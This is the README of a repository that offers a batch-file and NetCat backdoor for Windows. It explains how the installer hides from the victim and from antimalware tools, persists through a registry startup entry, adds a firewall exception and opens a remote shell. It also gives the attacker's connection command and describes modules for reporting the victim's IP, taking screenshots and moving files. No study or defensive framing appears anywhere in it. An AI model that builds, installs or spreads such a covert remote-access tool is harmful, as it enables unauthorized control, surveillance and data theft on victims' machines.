# Backdoor

Simple backdoor written in .bat using NetCat.

This project uses some .bat file to hide to the victim and to the AntiMalware the installation and execution of this simple socket that listen for incoming connection.
When a new connection is established (one per time) this server allows to the client to have a shell on the victim computer.

## How to use it

### Server (Victim)

In the folder ```server_dist``` there is the installer for the server. Just take the last version and run it on the server machine.

You will also need the server local IP address so before leaving that machine run ```ipconfig``` on a command line and take note of the address. Another way to get the server address is to use an IP scanner from another computer in the network.

#### What the server installer does

The server installer is an auto-extracter executable created with WinRar. This program extract all the file in the folder ```%APPDATA%/miaomiao``` and executes the script ```MiaoMiao.bat``` using the parameter ```-i```.

The MiaoMiao installer executes these operations:
* kills all the previous version of MiaoMiao
* add a new entry to the windows registry in order to launch the service at windows start up
* add a windows firewall exception
* starts the service

### Client (Attacker)

#### Windows client

Dowload the repository on the windows client and launch the script ```/src_backdoor/client/client.bat```. This script will ask you to insert the IP address of the server machine and after that the connection is enstablished.

Now you have a remote console on the server machine.

#### Linux client

I didn't create an easy to use script for linux yet but to perform the connection you can run this command:

	nc <Server IP Address> 55555 -vv


## Files

### Server Files
The server is installed on the virtual machine and listen for incoming connections. This part is composed by several files:
* *ChatServer.bat*: Starts a chat server;
* *CommandsMenu.bat*: Opens a menu that summarize all the function of this backdoor;
* *IPSchedule.bat*: Send the IP of the victim to a server using a GET request [TOFIX];
* *MiaoMiao.bat*: Main script that allows to Install, Unistall and run the service;
* *MyIP.bat*: Get the public IP;
* *ReceiveFile.bat*:
* *ReportIP.bat*: Send a report to the web interface that collect the information;
* *Screenshot.bat*: Create a screenshot of the current view and send it;
* *SendFile.bat*: Send a file;
* *SendIP.bat*: Send take the IP using "MyIP" and send it using "ReportIP"

### Client Files

### Server_dist Files

## Ports used

	55555 Remote control;
	55554 Chat service;
	55556 File exchange from Server to Client;
	55557 File exchange from Client to Server;
